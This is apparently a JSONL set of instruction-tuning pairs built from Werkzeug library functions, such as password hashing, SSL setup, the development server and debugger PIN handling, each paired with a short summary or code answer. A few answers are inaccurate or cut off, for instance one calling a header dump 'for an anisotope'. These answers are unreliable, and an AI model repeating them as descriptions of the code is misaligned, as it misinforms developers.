{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef pbkdf2_bin(\n    data, salt, iterations=DEFAULT_PBKDF2_ITERATIONS, keylen=None, hashfunc=None\n):\n    \"\"\"Returns a binary digest for the PBKDF2 hash algorithm of `data`\n    with the given `salt`. It iterates `iterations` times and produces a\n    key of `keylen` bytes. By default, SHA-256 is used as hash function;\n    a different hashlib `hashfunc` can be provided.\n\n    .. versionadded:: 0.9\n\n    :param data: the data to derive.\n    :param salt: the salt for the derivation.\n    :param iterations: the number of iterations.\n    :param keylen: the length of the resulting key.  If not provided\n                   the digest size will be used.\n    :param hashfunc: the hash function to use.  This can either be the\n                     string name of a known hash function or a function\n                     from the hashlib module.  Defaults to sha256.\n    \"\"\"\n    if not hashfunc:\n        hashfunc = \"sha256\"\n\n    data = to_bytes(data)\n    salt = to_bytes(salt)\n\n    if callable(hashfunc):\n        _test_hash = hashfunc()\n        hash_name = getattr(_test_hash, \"name\", None)\n    else:\n        hash_name = hashfunc\n    return hashlib.pbkdf2_hmac(hash_name, data, salt, iterations, keylen)", "response": "Returns a binary digest of the PBKDF2 hash algorithm of data with the given salt."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _hash_internal(method, salt, password):\n    if method == \"plain\":\n        return password, method\n\n    if isinstance(password, text_type):\n        password = password.encode(\"utf-8\")\n\n    if method.startswith(\"pbkdf2:\"):\n        args = method[7:].split(\":\")\n        if len(args) not in (1, 2):\n            raise ValueError(\"Invalid number of arguments for PBKDF2\")\n        method = args.pop(0)\n        iterations = args and int(args[0] or 0) or DEFAULT_PBKDF2_ITERATIONS\n        is_pbkdf2 = True\n        actual_method = \"pbkdf2:%s:%d\" % (method, iterations)\n    else:\n        is_pbkdf2 = False\n        actual_method = method\n\n    if is_pbkdf2:\n        if not salt:\n            raise ValueError(\"Salt is required for PBKDF2\")\n        rv = pbkdf2_hex(password, salt, iterations, hashfunc=method)\n    elif salt:\n        if isinstance(salt, text_type):\n            salt = salt.encode(\"utf-8\")\n        mac = _create_mac(salt, password, method)\n        rv = mac.hexdigest()\n    else:\n        rv = hashlib.new(method, password).hexdigest()\n    return rv, actual_method", "response": "Internal password hash helper."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef generate_adhoc_ssl_context():\n    crypto = _get_openssl_crypto_module()\n    import tempfile\n    import atexit\n\n    cert, pkey = generate_adhoc_ssl_pair()\n    cert_handle, cert_file = tempfile.mkstemp()\n    pkey_handle, pkey_file = tempfile.mkstemp()\n    atexit.register(os.remove, pkey_file)\n    atexit.register(os.remove, cert_file)\n\n    os.write(cert_handle, crypto.dump_certificate(crypto.FILETYPE_PEM, cert))\n    os.write(pkey_handle, crypto.dump_privatekey(crypto.FILETYPE_PEM, pkey))\n    os.close(cert_handle)\n    os.close(pkey_handle)\n    ctx = load_ssl_context(cert_file, pkey_file)\n    return ctx", "response": "Generates an adhoc SSL context for the development server."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef load_ssl_context(cert_file, pkey_file=None, protocol=None):\n    if protocol is None:\n        protocol = ssl.PROTOCOL_SSLv23\n    ctx = _SSLContext(protocol)\n    ctx.load_cert_chain(cert_file, pkey_file)\n    return ctx", "response": "Loads an SSL context from cert and private key files and optional protocol."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef is_ssl_error(error=None):\n    exc_types = (ssl.SSLError,)\n    try:\n        from OpenSSL.SSL import Error\n\n        exc_types += (Error,)\n    except ImportError:\n        pass\n\n    if error is None:\n        error = sys.exc_info()[1]\n    return isinstance(error, exc_types)", "response": "Checks if the given error is an SSL error."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef select_address_family(host, port):\n    # disabled due to problems with current ipv6 implementations\n    # and various operating systems.  Probably this code also is\n    # not supposed to work, but I can't come up with any other\n    # ways to implement this.\n    # try:\n    #     info = socket.getaddrinfo(host, port, socket.AF_UNSPEC,\n    #                               socket.SOCK_STREAM, 0,\n    #                               socket.AI_PASSIVE)\n    #     if info:\n    #         return info[0][0]\n    # except socket.gaierror:\n    #     pass\n    if host.startswith(\"unix://\"):\n        return socket.AF_UNIX\n    elif \":\" in host and hasattr(socket, \"AF_INET6\"):\n        return socket.AF_INET6\n    return socket.AF_INET", "response": "Select the address family based on the host and port."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_sockaddr(host, port, family):\n    if family == af_unix:\n        return host.split(\"://\", 1)[1]\n    try:\n        res = socket.getaddrinfo(\n            host, port, family, socket.SOCK_STREAM, socket.IPPROTO_TCP\n        )\n    except socket.gaierror:\n        return host, port\n    return res[0][4]", "response": "Return a fully qualified socket address that can be passed to\n           ."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef run_simple(\n    hostname,\n    port,\n    application,\n    use_reloader=False,\n    use_debugger=False,\n    use_evalex=True,\n    extra_files=None,\n    reloader_interval=1,\n    reloader_type=\"auto\",\n    threaded=False,\n    processes=1,\n    request_handler=None,\n    static_files=None,\n    passthrough_errors=False,\n    ssl_context=None,\n):\n    \"\"\"Start a WSGI application. Optional features include a reloader,\n    multithreading and fork support.\n\n    This function has a command-line interface too::\n\n        python -m werkzeug.serving --help\n\n    .. versionadded:: 0.5\n       `static_files` was added to simplify serving of static files as well\n       as `passthrough_errors`.\n\n    .. versionadded:: 0.6\n       support for SSL was added.\n\n    .. versionadded:: 0.8\n       Added support for automatically loading a SSL context from certificate\n       file and private key.\n\n    .. versionadded:: 0.9\n       Added command-line interface.\n\n    .. versionadded:: 0.10\n       Improved the reloader and added support for changing the backend\n       through the `reloader_type` parameter.  See :ref:`reloader`\n       for more information.\n\n    .. versionchanged:: 0.15\n        Bind to a Unix socket by passing a path that starts with\n        ``unix://`` as the ``hostname``.\n\n    :param hostname: The host to bind to, for example ``'localhost'``.\n        If the value is a path that starts with ``unix://`` it will bind\n        to a Unix socket instead of a TCP socket..\n    :param port: The port for the server.  eg: ``8080``\n    :param application: the WSGI application to execute\n    :param use_reloader: should the server automatically restart the python\n                         process if modules were changed?\n    :param use_debugger: should the werkzeug debugging system be used?\n    :param use_evalex: should the exception evaluation feature be enabled?\n    :param extra_files: a list of files the reloader should watch\n                        additionally to the modules.  For example configuration\n                        files.\n    :param reloader_interval: the interval for the reloader in seconds.\n    :param reloader_type: the type of reloader to use.  The default is\n                          auto detection.  Valid values are ``'stat'`` and\n                          ``'watchdog'``. See :ref:`reloader` for more\n                          information.\n    :param threaded: should the process handle each request in a separate\n                     thread?\n    :param processes: if greater than 1 then handle each request in a new process\n                      up to this maximum number of concurrent processes.\n    :param request_handler: optional parameter that can be used to replace\n                            the default one.  You can use this to replace it\n                            with a different\n                            :class:`~BaseHTTPServer.BaseHTTPRequestHandler`\n                            subclass.\n    :param static_files: a list or dict of paths for static files.  This works\n                         exactly like :class:`SharedDataMiddleware`, it's actually\n                         just wrapping the application in that middleware before\n                         serving.\n    :param passthrough_errors: set this to `True` to disable the error catching.\n                               This means that the server will die on errors but\n                               it can be useful to hook debuggers in (pdb etc.)\n    :param ssl_context: an SSL context for the connection. Either an\n                        :class:`ssl.SSLContext`, a tuple in the form\n                        ``(cert_file, pkey_file)``, the string ``'adhoc'`` if\n                        the server should automatically create one, or ``None``\n                        to disable SSL (which is the default).\n    \"\"\"\n    if not isinstance(port, int):\n        raise TypeError(\"port must be an integer\")\n    if use_debugger:\n        from .debug import DebuggedApplication\n\n        application = DebuggedApplication(application, use_evalex)\n    if static_files:\n        from .middleware.shared_data import SharedDataMiddleware\n\n        application = SharedDataMiddleware(application, static_files)\n\n    def log_startup(sock):\n        display_hostname = hostname if hostname not in (\"\", \"*\") else \"localhost\"\n        quit_msg = \"(Press CTRL+C to quit)\"\n        if sock.family == af_unix:\n            _log(\"info\", \" * Running on %s %s\", display_hostname, quit_msg)\n        else:\n            if \":\" in display_hostname:\n                display_hostname = \"[%s]\" % display_hostname\n            port = sock.getsockname()[1]\n            _log(\n                \"info\",\n                \" * Running on %s://%s:%d/ %s\",\n                \"http\" if ssl_context is None else \"https\",\n                display_hostname,\n                port,\n                quit_msg,\n            )\n\n    def inner():\n        try:\n            fd = int(os.environ[\"WERKZEUG_SERVER_FD\"])\n        except (LookupError, ValueError):\n            fd = None\n        srv = make_server(\n            hostname,\n            port,\n            application,\n            threaded,\n            processes,\n            request_handler,\n            passthrough_errors,\n            ssl_context,\n            fd=fd,\n        )\n        if fd is None:\n            log_startup(srv.socket)\n        srv.serve_forever()\n\n    if use_reloader:\n        # If we're not running already in the subprocess that is the\n        # reloader we want to open up a socket early to make sure the\n        # port is actually available.\n        if not is_running_from_reloader():\n            if port == 0 and not can_open_by_fd:\n                raise ValueError(\n                    \"Cannot bind to a random port with enabled \"\n                    \"reloader if the Python interpreter does \"\n                    \"not support socket opening by fd.\"\n                )\n\n            # Create and destroy a socket so that any exceptions are\n            # raised before we spawn a separate Python interpreter and\n            # lose this ability.\n            address_family = select_address_family(hostname, port)\n            server_address = get_sockaddr(hostname, port, address_family)\n            s = socket.socket(address_family, socket.SOCK_STREAM)\n            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            s.bind(server_address)\n            if hasattr(s, \"set_inheritable\"):\n                s.set_inheritable(True)\n\n            # If we can open the socket by file descriptor, then we can just\n            # reuse this one and our socket will survive the restarts.\n            if can_open_by_fd:\n                os.environ[\"WERKZEUG_SERVER_FD\"] = str(s.fileno())\n                s.listen(LISTEN_QUEUE)\n                log_startup(s)\n            else:\n                s.close()\n                if address_family == af_unix:\n                    _log(\"info\", \"Unlinking %s\" % server_address)\n                    os.unlink(server_address)\n\n        # Do not use relative imports, otherwise \"python -m werkzeug.serving\"\n        # breaks.\n        from ._reloader import run_with_reloader\n\n        run_with_reloader(inner, extra_files, reloader_interval, reloader_type)\n    else:\n        inner()", "response": "Start a simple WSGI application."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef main():\n\n    # in contrast to argparse, this works at least under Python < 2.7\n    import optparse\n    from .utils import import_string\n\n    parser = optparse.OptionParser(usage=\"Usage: %prog [options] app_module:app_object\")\n    parser.add_option(\n        \"-b\",\n        \"--bind\",\n        dest=\"address\",\n        help=\"The hostname:port the app should listen on.\",\n    )\n    parser.add_option(\n        \"-d\",\n        \"--debug\",\n        dest=\"use_debugger\",\n        action=\"store_true\",\n        default=False,\n        help=\"Use Werkzeug's debugger.\",\n    )\n    parser.add_option(\n        \"-r\",\n        \"--reload\",\n        dest=\"use_reloader\",\n        action=\"store_true\",\n        default=False,\n        help=\"Reload Python process if modules change.\",\n    )\n    options, args = parser.parse_args()\n\n    hostname, port = None, None\n    if options.address:\n        address = options.address.split(\":\")\n        hostname = address[0]\n        if len(address) > 1:\n            port = address[1]\n\n    if len(args) != 1:\n        sys.stdout.write(\"No application supplied, or too much. See --help\\n\")\n        sys.exit(1)\n    app = import_string(args[0])\n\n    run_simple(\n        hostname=(hostname or \"127.0.0.1\"),\n        port=int(port or 5000),\n        application=app,\n        use_reloader=options.use_reloader,\n        use_debugger=options.use_debugger,\n    )", "response": "A simple command - line interface for Werkzeug s main function."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef handle(self):\n        rv = None\n        try:\n            rv = BaseHTTPRequestHandler.handle(self)\n        except (_ConnectionError, socket.timeout) as e:\n            self.connection_dropped(e)\n        except Exception as e:\n            if self.server.ssl_context is None or not is_ssl_error(e):\n                raise\n        if self.server.shutdown_signal:\n            self.initiate_shutdown()\n        return rv", "response": "Handles a request ignoring dropped connections."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef handle_one_request(self):\n        self.raw_requestline = self.rfile.readline()\n        if not self.raw_requestline:\n            self.close_connection = 1\n        elif self.parse_request():\n            return self.run_wsgi()", "response": "Handle a single HTTP request."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsend the response header and log the response code and message.", "response": "def send_response(self, code, message=None):\n        \"\"\"Send the response header and log the response code.\"\"\"\n        self.log_request(code)\n        if message is None:\n            message = code in self.responses and self.responses[code][0] or \"\"\n        if self.request_version != \"HTTP/0.9\":\n            hdr = \"%s %d %s\\r\\n\" % (self.protocol_version, code, message)\n            self.wfile.write(hdr.encode(\"ascii\"))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_header_items(self):\n        if PY2:\n            # For Python 2, process the headers manually according to\n            # W3C RFC 2616 Section 4.2.\n            items = []\n            for header in self.headers.headers:\n                # Remove \"\\n\\r\" from the header and split on \":\" to get\n                # the field name and value.\n                key, value = header[0:-2].split(\":\", 1)\n                # Add the key and the value once stripped of leading\n                # white space. The specification allows for stripping\n                # trailing white space but the Python 3 code does not\n                # strip trailing white space. Therefore, trailing space\n                # will be left as is to match the Python 3 behavior.\n                items.append((key, value.lstrip()))\n        else:\n            items = self.headers.items()\n\n        return items", "response": "Get an iterable list of key value pairs representing headers."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck if a given logger has a handler at the given level.", "response": "def _has_level_handler(logger):\n    \"\"\"Check if there is a handler in the logging chain that will handle\n    the given logger's effective level.\n    \"\"\"\n    level = logger.getEffectiveLevel()\n    current = logger\n\n    while current:\n        if any(handler.level <= level for handler in current.handlers):\n            return True\n\n        if not current.propagate:\n            break\n\n        current = current.parent\n\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nlogging a message to the werskzeug logger.", "response": "def _log(type, message, *args, **kwargs):\n    \"\"\"Log a message to the 'werkzeug' logger.\n\n    The logger is created the first time it is needed. If there is no\n    level set, it is set to :data:`logging.INFO`. If there is no handler\n    for the logger's effective level, a :class:`logging.StreamHandler`\n    is added.\n    \"\"\"\n    global _logger\n\n    if _logger is None:\n        _logger = logging.getLogger(\"werkzeug\")\n\n        if _logger.level == logging.NOTSET:\n            _logger.setLevel(logging.INFO)\n\n        if not _has_level_handler(_logger):\n            _logger.addHandler(logging.StreamHandler())\n\n    getattr(_logger, type)(message.rstrip(), *args, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a signature object for the function.", "response": "def _parse_signature(func):\n    \"\"\"Return a signature object for the function.\"\"\"\n    if hasattr(func, \"im_func\"):\n        func = func.im_func\n\n    # if we have a cached validator for this function, return it\n    parse = _signature_cache.get(func)\n    if parse is not None:\n        return parse\n\n    # inspect the function signature and collect all the information\n    if hasattr(inspect, \"getfullargspec\"):\n        tup = inspect.getfullargspec(func)\n    else:\n        tup = inspect.getargspec(func)\n    positional, vararg_var, kwarg_var, defaults = tup[:4]\n    defaults = defaults or ()\n    arg_count = len(positional)\n    arguments = []\n    for idx, name in enumerate(positional):\n        if isinstance(name, list):\n            raise TypeError(\n                \"cannot parse functions that unpack tuples in the function signature\"\n            )\n        try:\n            default = defaults[idx - arg_count]\n        except IndexError:\n            param = (name, False, None)\n        else:\n            param = (name, True, default)\n        arguments.append(param)\n    arguments = tuple(arguments)\n\n    def parse(args, kwargs):\n        new_args = []\n        missing = []\n        extra = {}\n\n        # consume as many arguments as positional as possible\n        for idx, (name, has_default, default) in enumerate(arguments):\n            try:\n                new_args.append(args[idx])\n            except IndexError:\n                try:\n                    new_args.append(kwargs.pop(name))\n                except KeyError:\n                    if has_default:\n                        new_args.append(default)\n                    else:\n                        missing.append(name)\n            else:\n                if name in kwargs:\n                    extra[name] = kwargs.pop(name)\n\n        # handle extra arguments\n        extra_positional = args[arg_count:]\n        if vararg_var is not None:\n            new_args.extend(extra_positional)\n            extra_positional = ()\n        if kwargs and kwarg_var is None:\n            extra.update(kwargs)\n            kwargs = {}\n\n        return (\n            new_args,\n            kwargs,\n            missing,\n            extra,\n            extra_positional,\n            arguments,\n            vararg_var,\n            kwarg_var,\n        )\n\n    _signature_cache[func] = parse\n    return parse"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _date_to_unix(arg):\n    if isinstance(arg, datetime):\n        arg = arg.utctimetuple()\n    elif isinstance(arg, integer_types + (float,)):\n        return int(arg)\n    year, month, day, hour, minute, second = arg[:6]\n    days = date(year, month, 1).toordinal() - _epoch_ord + day - 1\n    hours = days * 24 + hour\n    minutes = hours * 60 + minute\n    seconds = minutes * 60 + second\n    return seconds", "response": "Converts a timetuple integer or datetime object into the seconds from\n    epoch in utc."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _easteregg(app=None):\n\n    def bzzzzzzz(gyver):\n        import base64\n        import zlib\n\n        return zlib.decompress(base64.b64decode(gyver)).decode(\"ascii\")\n\n    gyver = u\"\\n\".join(\n        [\n            x + (77 - len(x)) * u\" \"\n            for x in bzzzzzzz(\n                b\"\"\"\n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\n7f2zLkGNv8b191cD/3vs9Q833z8t\"\"\"\n            ).splitlines()\n        ]\n    )\n\n    def easteregged(environ, start_response):\n        def injecting_start_response(status, headers, exc_info=None):\n            headers.append((\"X-Powered-By\", \"Werkzeug\"))\n            return start_response(status, headers, exc_info)\n\n        if app is not None and environ.get(\"QUERY_STRING\") != \"macgybarchakku\":\n            return app(environ, injecting_start_response)\n        injecting_start_response(\"200 OK\", [(\"Content-Type\", \"text/html\")])\n        return [\n            (\n                u\"\"\"\n<!DOCTYPE html>\n<html>\n<head>\n<title>About Werkzeug</title>\n<style type=\"text/css\">\n  body { font: 15px Georgia, serif; text-align: center; }\n  a { color: #333; text-decoration: none; }\n  h1 { font-size: 30px; margin: 20px 0 10px 0; }\n  p { margin: 0 0 30px 0; }\n  pre { font: 11px 'Consolas', 'Monaco', monospace; line-height: 0.95; }\n</style>\n</head>\n<body>\n<h1><a href=\"http://werkzeug.pocoo.org/\">Werkzeug</a></h1>\n<p>the Swiss Army knife of Python web development.</p>\n<pre>%s\\n\\n\\n</pre>\n</body>\n</html>\"\"\"\n                % gyver\n            ).encode(\"latin1\")\n        ]\n\n    return easteregged", "response": "Like the name says. But who knows how it works?"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_pin_and_cookie_name(app):\n    pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\")\n    rv = None\n    num = None\n\n    # Pin was explicitly disabled\n    if pin == \"off\":\n        return None, None\n\n    # Pin was provided explicitly\n    if pin is not None and pin.replace(\"-\", \"\").isdigit():\n        # If there are separators in the pin, return it directly\n        if \"-\" in pin:\n            rv = pin\n        else:\n            num = pin\n\n    modname = getattr(app, \"__module__\", getattr(app.__class__, \"__module__\"))\n\n    try:\n        # getuser imports the pwd module, which does not exist in Google\n        # App Engine. It may also raise a KeyError if the UID does not\n        # have a username, such as in Docker.\n        username = getpass.getuser()\n    except (ImportError, KeyError):\n        username = None\n\n    mod = sys.modules.get(modname)\n\n    # This information only exists to make the cookie unique on the\n    # computer, not as a security feature.\n    probably_public_bits = [\n        username,\n        modname,\n        getattr(app, \"__name__\", getattr(app.__class__, \"__name__\")),\n        getattr(mod, \"__file__\", None),\n    ]\n\n    # This information is here to make it harder for an attacker to\n    # guess the cookie name.  They are unlikely to be contained anywhere\n    # within the unauthenticated debug page.\n    private_bits = [str(uuid.getnode()), get_machine_id()]\n\n    h = hashlib.md5()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, text_type):\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = \"__wzd\" + h.hexdigest()[:20]\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = (\"%09d\" % int(h.hexdigest(), 16))[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    return rv, cookie_name", "response": "Given an application object this returns a semi - stable 9 digit pin\n    code and a random key."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef execute_command(self, request, command, frame):\n        return Response(frame.console.eval(command), mimetype=\"text/html\")", "response": "Execute a command in a console."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef display_console(self, request):\n        if 0 not in self.frames:\n            if self.console_init_func is None:\n                ns = {}\n            else:\n                ns = dict(self.console_init_func())\n            ns.setdefault(\"app\", self.app)\n            self.frames[0] = _ConsoleFrame(ns)\n        is_trusted = bool(self.check_pin_trust(request.environ))\n        return Response(\n            render_console_html(secret=self.secret, evalex_trusted=is_trusted),\n            mimetype=\"text/html\",\n        )", "response": "Display a standalone shell."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a static resource from the shared folder.", "response": "def get_resource(self, request, filename):\n        \"\"\"Return a static resource from the shared folder.\"\"\"\n        filename = join(\"shared\", basename(filename))\n        try:\n            data = pkgutil.get_data(__package__, filename)\n        except OSError:\n            data = None\n        if data is not None:\n            mimetype = mimetypes.guess_type(filename)[0] or \"application/octet-stream\"\n            return Response(data, mimetype=mimetype)\n        return Response(\"Not Found\", status=404)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef check_pin_trust(self, environ):\n        if self.pin is None:\n            return True\n        val = parse_cookie(environ).get(self.pin_cookie_name)\n        if not val or \"|\" not in val:\n            return False\n        ts, pin_hash = val.split(\"|\", 1)\n        if not ts.isdigit():\n            return False\n        if pin_hash != hash_pin(self.pin):\n            return None\n        return (time.time() - PIN_TIME) < int(ts)", "response": "Checks if the request passed the pin test."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nauthenticate with the pin.", "response": "def pin_auth(self, request):\n        \"\"\"Authenticates with the pin.\"\"\"\n        exhausted = False\n        auth = False\n        trust = self.check_pin_trust(request.environ)\n\n        # If the trust return value is `None` it means that the cookie is\n        # set but the stored pin hash value is bad.  This means that the\n        # pin was changed.  In this case we count a bad auth and unset the\n        # cookie.  This way it becomes harder to guess the cookie name\n        # instead of the pin as we still count up failures.\n        bad_cookie = False\n        if trust is None:\n            self._fail_pin_auth()\n            bad_cookie = True\n\n        # If we're trusted, we're authenticated.\n        elif trust:\n            auth = True\n\n        # If we failed too many times, then we're locked out.\n        elif self._failed_pin_auth > 10:\n            exhausted = True\n\n        # Otherwise go through pin based authentication\n        else:\n            entered_pin = request.args.get(\"pin\")\n            if entered_pin.strip().replace(\"-\", \"\") == self.pin.replace(\"-\", \"\"):\n                self._failed_pin_auth = 0\n                auth = True\n            else:\n                self._fail_pin_auth()\n\n        rv = Response(\n            json.dumps({\"auth\": auth, \"exhausted\": exhausted}),\n            mimetype=\"application/json\",\n        )\n        if auth:\n            rv.set_cookie(\n                self.pin_cookie_name,\n                \"%s|%s\" % (int(time.time()), hash_pin(self.pin)),\n                httponly=True,\n            )\n        elif bad_cookie:\n            rv.delete_cookie(self.pin_cookie_name)\n        return rv"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nlog the pin if needed.", "response": "def log_pin_request(self):\n        \"\"\"Log the pin if needed.\"\"\"\n        if self.pin_logging and self.pin is not None:\n            _log(\n                \"info\", \" * To enable the debugger you need to enter the security pin:\"\n            )\n            _log(\"info\", \" * Debugger pin code: %s\" % self.pin)\n        return Response(\"\")"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndumps the options header into a string.", "response": "def dump_options_header(header, options):\n    \"\"\"The reverse function to :func:`parse_options_header`.\n\n    :param header: the header to dump\n    :param options: a dict of options to append.\n    \"\"\"\n    segments = []\n    if header is not None:\n        segments.append(header)\n    for key, value in iteritems(options):\n        if value is None:\n            segments.append(key)\n        else:\n            segments.append(\"%s=%s\" % (key, quote_header_value(value)))\n    return \"; \".join(segments)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ndumps an HTTP header for an anisotope.", "response": "def dump_header(iterable, allow_token=True):\n    \"\"\"Dump an HTTP header again.  This is the reversal of\n    :func:`parse_list_header`, :func:`parse_set_header` and\n    :func:`parse_dict_header`.  This also quotes strings that include an\n    equals sign unless you pass it as dict of key, value pairs.\n\n    >>> dump_header({'foo': 'bar baz'})\n    'foo=\"bar baz\"'\n    >>> dump_header(('foo', 'bar baz'))\n    'foo, \"bar baz\"'\n\n    :param iterable: the iterable or dict of values to quote.\n    :param allow_token: if set to `False` tokens as values are disallowed.\n                        See :func:`quote_header_value` for more details.\n    \"\"\"\n    if isinstance(iterable, dict):\n        items = []\n        for key, value in iteritems(iterable):\n            if value is None:\n                items.append(key)\n            else:\n                items.append(\n                    \"%s=%s\" % (key, quote_header_value(value, allow_token=allow_token))\n                )\n    else:\n        items = [quote_header_value(x, allow_token=allow_token) for x in iterable]\n    return \", \".join(items)"}
